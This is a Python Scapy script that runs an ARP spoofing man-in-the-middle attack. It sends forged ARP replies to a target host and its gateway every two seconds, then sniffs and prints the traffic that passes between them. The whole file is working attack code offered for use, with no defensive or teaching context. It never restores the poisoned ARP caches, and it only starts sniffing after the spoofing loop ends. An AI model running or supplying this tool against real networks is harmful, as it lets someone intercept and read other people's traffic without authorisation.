import sys
import time
from scapy.layers.l2 import getmacbyip, ARP
from scapy.sendrecv import send, sniff
from scapy.layers.inet import IP

# Define the ARP spoofing function to send fake ARP packets to the target and gateway
def arp_spoof(target_ip, gateway_ip):
    # Get the MAC addresses of the target and gateway
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)

    # Craft ARP packets with the appropriate source and destination IP and MAC addresses
    target_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    # Send the ARP packets to the network
    send(target_packet)
    send(gateway_packet)

# Define the packet sniffing function to capture packets between the target and gateway
def sniff_packets(iface, target_ip, gateway_ip):
    # Define a filter to capture packets only between the target and gateway
    sniff_filter = "ip host " + target_ip

    # Start sniffing packets on the network interface using the defined filter
    sniff(iface=iface, prn=packet_callback, filter=sniff_filter)

# Define the packet callback function to print the contents of captured packets
def packet_callback(packet):
    # Check if the packet is an IP packet
    if packet.haslayer(IP):
        # If the packet was sent by the target to the gateway, print a message
        if packet[IP].src == target_ip and packet[IP].dst == gateway_ip:
            print("[+] Sent packet: " + str(packet[IP]))
        # If the packet was sent by the gateway to the target, print a message
        elif packet[IP].src == gateway_ip and packet[IP].dst == target_ip:
            print("[+] Received packet: " + str(packet[IP]))

if __name__ == "__main__":
    # Check that the script is being used correctly with two arguments (target IP and gateway IP)
    if len(sys.argv) != 3:
        print("Usage: " + sys.argv[0] + " <target_ip> <gateway_ip>")
        sys.exit(1)

    # Get the target IP and gateway IP from the command-line arguments
    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    # Set the network interface to use for ARP spoofing and packet sniffing
    iface = "eth0"  # Change this to your network interface

    # Start ARP spoofing by sending fake ARP packets to the target and gateway
    print("[+] Starting ARP spoofing...")
    while True:
        try:
            arp_spoof(target_ip, gateway_ip)
            time.sleep(2)  # Pause for 2 seconds between sending ARP packets
        except KeyboardInterrupt:
            print("\n[+] Stopping ARP spoofing...")
            break

    # Start packet sniffing on the network interface to capture packets between the target and gateway
    print("[+] Starting packet sniffing...")
    sniff_packets(iface, target_ip, gateway_ip)